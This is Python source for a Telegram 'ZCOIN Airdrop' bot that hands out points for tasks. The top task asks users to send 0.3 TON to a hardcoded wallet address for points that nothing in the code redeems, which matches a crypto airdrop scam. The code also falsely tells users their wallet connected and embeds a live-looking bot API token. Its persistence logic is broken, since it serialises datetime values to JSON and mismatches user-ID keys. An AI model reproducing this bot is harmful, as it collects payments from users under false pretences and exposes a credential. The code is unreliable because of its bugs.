import telebot
from datetime import datetime, timedelta
import json
import hashlib

API_TOKEN = '7958715064:AAHFq8hOx9ivvpKafmHwX3FFX-DvPuul-AI'
bot = telebot.TeleBot(API_TOKEN)

# Load user data from JSON file
def load_user_data():
    global user_data
    try:
        with open("user_data.json", "r") as file:
            user_data = json.load(file)
    except FileNotFoundError:
        user_data = {}

# Save user data to JSON file
def save_user_data():
    with open("user_data.json", "w") as file:
        json.dump(user_data, file)

# Generate unique referral link for each user
def generate_referral_link(user_id):
    ref_link = f"https://example.com/referral/{hashlib.md5(str(user_id).encode()).hexdigest()}"
    return ref_link

# Dictionary to hold user data
user_data = {}
load_user_data()

# Welcome and main menu handler
@bot.message_handler(commands=['start'])
def start_handler(message):
    user_id = message.from_user.id
    if user_id not in user_data:
        user_data[user_id] = {'points': 0, 'joined': datetime.now()}
    
    bot.send_message(
        user_id,
        "Welcome to the ZCOIN Airdrop!\n\n"
        "To earn points, complete the tasks below.\n\n"
        "🏆 Current Points: {}\n".format(user_data[user_id]['points']),
        reply_markup=main_menu()
    )
    save_user_data()

# Main Menu
def main_menu():
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.KeyboardButton("Home"),
        telebot.types.KeyboardButton("Tasks"),
        telebot.types.KeyboardButton("Invite Friends"),
        telebot.types.KeyboardButton("Connect Wallet")
    )
    return markup

# Task menu
@bot.message_handler(func=lambda message: message.text == "Tasks")
def task_menu(message):
    user_id = message.from_user.id
    markup = telebot.types.InlineKeyboardMarkup()
    
    tasks = [
        ("Make TON Awesome", "task_ton", 30000),
        ("Connect Wallet", "task_wallet", 800),
        ("Join Telegram Channel", "task_channel", 500),
        ("Follow on X (Twitter)", "task_x", 500),
        ("Invite 10 New Users", "task_invite_10", 10000),
        ("Complete All Tasks", "task_complete_all", 10000),
    ]
    
    for title, callback_data, points in tasks:
        button = telebot.types.InlineKeyboardButton(
            text=f"{title} - {points} Points", callback_data=callback_data
        )
        markup.add(button)
    
    bot.send_message(user_id, "Choose a task to complete:", reply_markup=markup)

# Task Handlers
@bot.callback_query_handler(func=lambda call: call.data.startswith("task_"))
def task_handler(call):
    user_id = call.from_user.id
    task_id = call.data
    now = datetime.now()

    if task_id == "task_ton":
        last_completed = user_data[user_id].get('last_task_ton')
        if last_completed and (now - last_completed) < timedelta(hours=24):
            bot.send_message(user_id, "You can only complete this task once every 24 hours.")
        else:
            bot.send_message(
                user_id,
                "To complete this task, send 0.3 TON to the following address:\n"
                "ton://transfer/UQASy6a0F1_2io0cs_9RtHM9yMM2OKbOvA2KKV5By0HC_rin?amount=300000000"
            )
            user_data[user_id]['points'] += 30000
            user_data[user_id]['last_task_ton'] = now  # Save task completion time
            save_user_data()

    elif task_id == "task_wallet":
        # Implement wallet connection here (mocked for this example)
        bot.send_message(user_id, "Wallet connected successfully!")
        user_data[user_id]['points'] += 800
        save_user_data()

    elif task_id == "task_channel":
        bot.send_message(
            user_id,
            "Join our Telegram channel:\nhttps://t.me/ZCOINCOMMUNNITYOFFICIAL"
        )
        user_data[user_id]['points'] += 500
        save_user_data()

    elif task_id == "task_x":
        bot.send_message(
            user_id,
            "Follow us on X:\nhttps://x.com/zcoin_crypto/status/1842917982663823721"
        )
        user_data[user_id]['points'] += 500
        save_user_data()

    elif task_id == "task_invite_10":
        referral_link = generate_referral_link(user_id)
        bot.send_message(
            user_id,
            f"Invite 10 friends to earn points. Share your referral link!\n\n{referral_link}"
        )
        user_data[user_id]['points'] += 10000
        save_user_data()

    elif task_id == "task_complete_all":
        bot.send_message(user_id, "Congratulations on completing all tasks!")
        user_data[user_id]['points'] += 10000
        save_user_data()

    # Update user with new points
    bot.send_message(user_id, "🏆 New Points: {}".format(user_data[user_id]['points']))

# Invite friends handler
@bot.message_handler(func=lambda message: message.text == "Invite Friends")
def invite_friends(message):
    user_id = message.from_user.id
    referral_link = generate_referral_link(user_id)
    bot.send_message(
        user_id,
        f"Invite friends with your referral link to earn points. Each referral brings you points!\n\n{referral_link}"
    )

# Connect wallet handler
@bot.message_handler(func=lambda message: message.text == "Connect Wallet")
def connect_wallet(message):
    user_id = message.from_user.id
    bot.send_message(user_id, "Connect your wallet to receive airdrop tokens.")
    # Here, you should implement wallet connection functionality

# Home handler
@bot.message_handler(func=lambda message: message.text == "Home")
def home_handler(message):
    user_id = message.from_user.id
    points = user_data[user_id]['points']
    bot.send_message(
        user_id,
        f"🏠 Welcome back!\n\n"
        f"🏆 Current Points: {points}\n\n"
        "Complete more tasks to earn more points!",
        reply_markup=main_menu()
    )

# Start the bot with error handling
try:
    print("Bot is running...")
    bot.infinity_polling()
except Exception as e:
    print(f"Error occurred: {e}")
    bot.stop_polling()
